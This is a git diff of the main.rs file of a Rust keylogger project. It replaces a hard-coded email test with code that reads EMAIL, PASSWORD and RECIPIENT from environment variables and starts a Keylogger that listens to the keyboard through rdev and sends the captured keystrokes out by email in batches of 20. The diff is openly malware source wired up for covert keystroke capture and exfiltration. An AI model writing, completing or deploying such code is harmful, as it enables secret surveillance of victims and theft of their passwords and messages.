@@ -3,29 +3,55 @@
     -----
         - Test out parsin by using the parsing function multiple times
             to deal with subcommands
-        - email handling
-        - keyboard listening handling
 */
-mod build;
-use lettre::message::{header, Mailbox, Message};
-use lettre::transport::smtp::authentication::Credentials;
-use lettre::{SmtpTransport, Transport};
-use rdev::{
-    listen, // runs a while true loop
-    Event,
-};
+mod keylogger;
+mod method;
+use keylogger::Keylogger;
+use method::Method;
+use rdev::{listen, Event};
 
+use std::env;
 use std::io::Result;
-use std::sync::{Arc, Mutex};
+use std::process::exit;
+use std::sync::LazyLock;
 use std::thread;
 
+static EMAIL: LazyLock<String> = LazyLock::new(|| match env::var("EMAIL") {
+    Ok(var) => var,
+    Err(_) => {
+        eprintln!("Environment variable \"EMAIL\" was not set.");
+        exit(1)
+    }
+});
+
+static PASSWORD: LazyLock<String> = LazyLock::new(|| match env::var("PASSWORD") {
+    Ok(var) => var,
+    Err(_) => {
+        eprintln!("Environment variable \"PASSWORD\" was not set.");
+        exit(1)
+    }
+});
+
+static RECIPIENT: LazyLock<String> = LazyLock::new(|| match env::var("RECIPIENT") {
+    Ok(var) => var,
+    Err(_) => {
+        eprintln!("Environment variable \"RECIPIENT\" was not set.");
+        exit(1)
+    }
+});
+
 fn main() {
-    let email = Message::builder()
-        .from("rustacean101@gmail.com".parse().unwrap())
-        .to("gmendieta4109@gmail.com".parse().unwrap())
-        .subject("Keylogger Update".to_string())
-        .header(header::ContentType::TEXT_PLAIN)
-        .body("Hi, This is the message".to_string())
-        .unwrap();
-    println!("{:#?}", email);
+    //let mut keylogger = Keylogger::new(Method::File {
+    //    path: "./keylogger_log.txt".to_string(),
+    //}).set_buffer_capacity(10);
+    //keylogger.start();
+    let email: String = dbg!(EMAIL.clone().to_string());
+    let password: String = dbg!(PASSWORD.clone().to_string());
+    let recipient: String = dbg!(RECIPIENT.clone().to_string());
+    let mut keylogger = Keylogger::new(Method::Email {
+        email,
+        password,
+        recipient
+    }).set_buffer_capacity(20);
+    keylogger.start();
 }
